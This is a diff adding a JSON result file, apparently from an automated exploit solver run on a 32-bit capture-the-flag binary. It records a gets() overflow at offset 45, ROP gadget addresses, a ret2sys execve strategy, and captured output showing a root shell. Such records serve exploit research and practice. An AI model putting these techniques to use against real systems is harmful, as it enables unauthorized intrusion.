@@ -1,0 +1,49 @@
+{
+  "name": "ch10_static32",
+  "ok": true,
+  "strategy": "ret2sys_write",
+  "detail": "gets(0x80ec180) -> main -> execve off=45",
+  "elapsed": 3.9,
+  "attempt_count": 1,
+  "flag_only": false,
+  "facts": {
+    "prot": {
+      "arch": "i386/32",
+      "pie": false,
+      "canary": false,
+      "nx": true,
+      "relro": "Partial",
+      "static": true
+    },
+    "vulns": [
+      "gets@0x80489f6 disp=15 off=45"
+    ],
+    "wins": [],
+    "binsh": null,
+    "gadgets": {
+      "syscall": "0x806363d",
+      "int80": "0x8070290",
+      "ret": "0x8048196",
+      "leave": "0x809ed41",
+      "pop_ebx": "0x80481ad",
+      "pop_edx": "0x806fcca",
+      "pop_eax": "0x8048b0b",
+      "pop_ecx_ebx": "0x806fcf1"
+    },
+    "csu": false,
+    "mmap_rwx": null,
+    "fmt_buf": null,
+    "libc": null,
+    "notes": []
+  },
+  "attempts": [
+    {
+      "strategy": "ret2sys_write",
+      "desc": "gets(0x80ec180) -> main -> execve off=45",
+      "ok": true,
+      "elapsed": 1.17,
+      "tail": "PWNED_42\nroot\nuid=0(root) gid=0(root) groups=0(root)\n"
+    }
+  ],
+  "error": ""
+}
